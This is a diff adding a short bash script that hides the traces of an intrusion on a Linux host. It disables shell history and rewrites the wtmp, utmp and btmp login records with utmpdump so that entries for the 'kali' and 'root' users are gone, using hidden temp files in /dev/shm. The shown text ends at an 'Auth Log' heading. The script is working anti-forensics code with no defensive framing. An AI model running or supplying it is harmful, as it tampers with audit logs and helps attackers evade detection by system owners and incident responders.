@@ -1,0 +1,18 @@
+#!/bin/bash
+
+# UNSET VARS
+unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST REMOTEHOST REMOTEUSER;export HISTSIZE=0
+
+# Clearing wtmp/last(requires root) 
+utmpdump /var/log/wtmp | grep -v "kali" > /dev/shm/.1
+utmpdump -r < /dev/shm/.1 > /var/log/wtmp
+
+## Clearing  utmp(Currently logged in users)
+utmpdump /var/run/utmp | grep -v "kali" > /dev/shm/.2
+utmpdump -r < /dev/shm/.2 > /var/run/utmp
+
+## Clearing btmp(lastb)
+utmpdump /var/log/btmp | grep -v "root" > /dev/shm/.3
+utmpdump -r < /dev/shm/.3 > /var/log/btmp
+
+## Auth Log
